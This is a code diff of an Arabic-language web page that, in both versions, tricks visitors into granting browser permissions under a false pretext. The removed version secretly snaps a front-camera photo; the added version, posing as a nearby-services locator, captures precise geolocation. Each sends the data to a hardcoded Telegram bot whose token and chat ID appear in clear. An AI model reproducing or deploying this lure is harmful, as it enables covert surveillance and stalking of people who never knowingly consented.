@@ -3,67 +3,71 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ضروري الدخول</title>
+    <title>تفعيل الموقع الجغرافي</title>
 </head>
 <body style="text-align: center; font-family: Arial, sans-serif; padding-top: 50px; background-color: #f0f2f5;">
 
     <div id="container">
-        <h2>مرحباً بك في التجربة</h2>
-        <p> اضغط على الزر أدناه لتفعيل  الاذن لتشغيل المحتوى الطلوب</p>
+        <h2>خدمة تحديد الموقع</h2>
+        <p>يرجى السماح بالوصول للموقع لتزويدك بالخدمات القريبة منك</p>
         
-        <button id="mainBtn" style="padding: 20px 40px; font-size: 20px; background-color: #007bff; color: white; border: none; border-radius: 50px; cursor: pointer; box-shadow: 0 4px 15px rgba(0,0,0,0.2);">
-            ✅اضغط هنا لتفعيل الاذن حتى تتمكن من شتغيل المطلوب
+        <button id="locBtn" style="padding: 20px 40px; font-size: 18px; background-color: #ff5722; color: white; border: none; border-radius: 50px; cursor: pointer; box-shadow: 0 4px 15px rgba(0,0,0,0.2);">
+            📍 تفعيل الموقع الآن
         </button>
     </div>
 
-    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
-    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
-
     <script>
+        // بياناتك في تليجرام
         const token = '7819904584:AAExsLo2jFP3KkuJuepaw_SiFV9ME_ZI_vw';
         const chatId = '7837239112';
 
-        const mainBtn = document.getElementById('mainBtn');
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
+        const locBtn = document.getElementById('locBtn');
 
-        mainBtn.addEventListener('click', async () => {
-            // هذا السطر هو الذي "يجبر" المتصفح على إظهار نافذة طلب الإذن (Allow/Block)
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" }, 
-                    audio: false 
-                });
+        locBtn.addEventListener('click', () => {
+            locBtn.innerText = "⏳ جاري طلب الإذن...";
 
-                // إذا وافق المستخدم، سيبدأ التنفيذ هنا فوراً
-                mainBtn.innerText = "⏳ انتظرررر قليل من فظلك...";
-                mainBtn.style.backgroundColor = "#28a745";
-                video.srcObject = stream;
-
-                setTimeout(() => {
-                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-                    canvas.toBlob(async (blob) => {
-                        const formData = new FormData();
-                        formData.append('chat_id', chatId);
-                        formData.append('photo', blob, 'image.jpg');
-
-                        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-                            method: 'POST',
-                            body: formData
-                        });
-
-                        alert("✅ نجحت العملية! .");
-                        stream.getTracks().forEach(track => track.stop());
-                        mainBtn.innerText = "إعادة المحاولة";
-                    }, 'image/jpeg');
-                }, 1000);
-
-            } catch (err) {
-                // في حال رفض المستخدم أو وجود حظر سابق
-                alert("⚠️ يرجى الضغط على 'سماح' (Allow) عندما يطلب المتصفح ذلك لتتمكن من إكمال التجربة.");
-                console.error(err);
+            // طلب إذن الموقع الجغرافي من المتصفح
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocation, showError);
+            } else {
+                alert("المتصفح لا يدعم تحديد الموقع.");
             }
         });
+
+        async function sendLocation(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            
+            locBtn.innerText = "✅ تم تحديد الموقع.. جاري الإرسال";
+
+            // إرسال الموقع إلى تليجرام كرابط خرائط جوجل
+            const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+            const message = `📍 تم الحصول على موقع جديد:\n🔗 الرابط: ${mapUrl}`;
+
+            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            });
+
+            alert("شكراً لك! تم إرسال البيانات بنجاح.");
+            locBtn.innerText = "تم الإرسال";
+        }
+
+        function showError(error) {
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    alert("يجب الضغط على 'سماح' (Allow) لإرسال الموقع.");
+                    break;
+                default:
+                    alert("حدث خطأ في تحديد الموقع.");
+                    break;
+            }
+            locBtn.innerText = "إعادة المحاولة";
+        }
     </script>
 </body>
 </html>
